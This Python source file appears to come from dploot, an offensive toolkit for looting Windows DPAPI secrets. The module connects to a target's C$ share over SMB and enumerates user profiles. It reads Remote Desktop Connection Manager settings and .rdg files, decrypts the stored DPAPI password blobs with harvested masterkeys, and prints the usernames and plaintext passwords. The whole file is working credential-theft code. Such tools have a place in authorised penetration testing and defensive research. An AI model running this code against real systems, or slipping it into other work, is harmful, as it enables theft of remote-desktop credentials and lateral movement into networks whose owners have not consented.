import logging
import ntpath
from typing import Any, List, Tuple
import xml.etree.ElementTree as ET
import base64

from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.triage.masterkeys import Masterkey

class RDGCred:
    def __init__(self, type, profile_name, username, password, server_name = None) -> None:
        self.type = type
        self.profile_name = profile_name
        self.server_name = server_name
        self.username = username
        self.password = password

    def dump(self) -> None:
        if self.type == 'cred':
            print('[CREDENTIAL PROFILES]')
            print('\tProfile Name:\t%s' % self.profile_name)
            print('\tUsername:\t%s' % self.username)
            print('\tPassword:\t%s' % self.password.decode('latin-1'))
        elif self.type == 'logon':
            print('[LOGON PROFILES]')
            print('\tProfile Name:\t%s' % self.profile_name)
            print('\tUsername:\t%s' % self.username)
            print('\tPassword:\t%s' % self.password.decode('latin-1'))
        elif self.type == 'server':
            print('[SERVER PROFILES]')
            print('\tName:\t\t%s' % self.server_name)
            print('\tProfile Name:\t%s' % self.profile_name)
            print('\tUsername:\t%s' % self.username)
            print('\tPassword:\t%s' % self.password.decode('latin-1'))
        print()
    
    def dump_quiet(self) -> None:
        if self.type == 'cred':
            print("[RDG] %s - %s:%s" % (self.profile_name, self.username, self.password.decode('latin-1')))
        elif self.type == 'logon':
            print("[RDG] %s - %s:%s" % (self.profile_name, self.username, self.password.decode('latin-1')))
        elif self.type == 'server':
            print("[RDG] %s - %s - %s:%s" % (self.profile_name, self.server_name, self.username, self.password.decode('latin-1')))

class RDCMANFile:
    def __init__(self, winuser: str, filepath:str, rdg_creds:List[RDGCred]) -> None:
        self.winuser = winuser
        self.filepath = filepath
        self.rdg_creds = rdg_creds

class RDGFile:
    def __init__(self, winuser: str, filepath:str, rdg_creds:List[RDGCred]) -> None:
        self.winuser = winuser
        self.filepath = filepath
        self.rdg_creds = rdg_creds

class RDGTriage:

    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
    user_rdcman_settings_generic_filepath = 'Users\\%s\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings'
    user_rdg_generic_filepath = ['Users\\%s\\Documents','Users\\%s\\Desktop']
    share = 'C$'

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: List[Masterkey]) -> None:
        self.target = target
        self.conn = conn
        
        self._users = None
        self.looted_files = dict()
        self.masterkeys = masterkeys

    def triage_rdcman(self) -> Tuple[List[RDCMANFile], List[RDGFile]]:
        rdcman_files = list()
        rdgfiles = list()
        for user in self.users:
            try:
                rdcman_user_file, rdg_user_files = self.triage_rdcman_for_user(user)
                rdcman_files.append(rdcman_user_file)
                rdgfiles += rdg_user_files
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                    logging.debug(str(e))
                pass
        return rdcman_files, rdgfiles

    def triage_rdcman_for_user(self, user: str) -> Tuple[RDCMANFile, List[RDGFile]]:
        rdcman_file = None
        rdgfiles = list()
        try:
            user_rcdman_settings_filepath = self.user_rdcman_settings_generic_filepath % user
            rdcmanblob_bytes = self.conn.readFile(self.share,user_rcdman_settings_filepath)
            if rdcmanblob_bytes:
                logging.debug("Found RDCMan Settings for %s user" %  (user))
                if rdcmanblob_bytes is not None and self.masterkeys is not None:
                    self.looted_files['%s_RDCMan.settings' % user] = rdcmanblob_bytes
                    xml_data = rdcmanblob_bytes
                    root = ET.fromstring(xml_data)
                    rdcman_file = RDCMANFile(winuser=user,filepath="\\\\%s\\%s\\%s" % (self.target.address,self.share,user_rcdman_settings_filepath), rdg_creds=self.triage_rdcman_settings(root))
                    rdgfiles_elements = root.find('.//FilesToOpen')
                    for item in rdgfiles_elements.findall('.//item'):
                        filename = item.text
                        if '\\\\' not in filename:
                            if 'C:\\' in filename:
                                filepath = filename.replace('C:\\','')
                                rdg_bytes = self.conn.readFile(self.share, filepath)
                                rdg_xml = ET.fromstring(rdg_bytes)
                                rdgfiles.append(RDCMANFile(winuser=user,filepath=filename, rdg_creds=self.triage_rdgprofile(rdg_xml)))             
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
                logging.debug(str(e))
            pass
        return rdcman_file, rdgfiles

    def triage_rdgprofile(self, rdgxml: ET.Element) -> List[RDGCred]:
        rdg_creds = list()
        for cred_profile in rdgxml.findall('.//credentialsProfile'):
            if cred_profile is not None:
                profile_name, username, password = self.triage_credprofile(cred_profile)
                rdg_creds.append(RDGCred(
                    type='cred',
                    profile_name=profile_name,
                    username=username,
                    password=password,
                ))

        for server_profile in rdgxml.findall('.//server'):
            server_name = server_profile.find('.//properties//name').text
            for item in server_profile.findall('.//logonCredentials'):
                profile_name, username, password = self.triage_credprofile(item)
                rdg_creds.append(RDGCred(
                    type='server',
                    profile_name=profile_name,
                    server_name=server_name,
                    username=username,
                    password=password,
                ))
        return rdg_creds


    def triage_rdcman_settings(self, rdcman_settings : ET.Element) -> List[RDGCred]:
        rdcman_creds = list()
        for cred_profile in rdcman_settings.findall('.//credentialsProfile'):
            if cred_profile is not None:
                profile_name, username, password = self.triage_credprofile(cred_profile)
                rdcman_creds.append(RDGCred(
                    type='cred',
                    profile_name=profile_name,
                    username=username,
                    password=password,
                ))

        for cred_profile in rdcman_settings.findall('.//logonCredentials'):
            if cred_profile is not None:
                profile_name, username, password = self.triage_credprofile(cred_profile)
                rdcman_creds.append(RDGCred(
                    type='logon',
                    profile_name=profile_name,
                    username=username,
                    password=password,
                ))
        return rdcman_creds

    def triage_credprofile(self, cred_node: ET.Element) -> Tuple[str, str, Any]:
        profile_name = cred_node.find('.//profileName').text
        full_username = ''
        password = None
        if cred_node.find(".//userName") is None:
            return
        else:
            username = cred_node.find('.//userName').text
            domain = cred_node.find('.//domain').text
            b64password = cred_node.find('.//password').text

            if domain == '':
                full_username = username
            else:
                full_username = '%s\\%s' % (domain, username)

            pass_dpapi_blob = base64.b64decode(b64password)
            masterkey = find_masterkey_for_blob(pass_dpapi_blob, self.masterkeys)
            if masterkey is not None:
                password = decrypt_blob(pass_dpapi_blob, masterkey)

        return profile_name, full_username, password

    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users
        
        users = list()

        users_dir_path = 'Users\\*'
        directories = self.conn.listPath(shareName=self.share, path=ntpath.normpath(users_dir_path))
        for d in directories:
            if d.get_longname() not in self.false_positive and d.is_directory() > 0:
                users.append(d.get_longname())
    
        self._users = users

        return self._users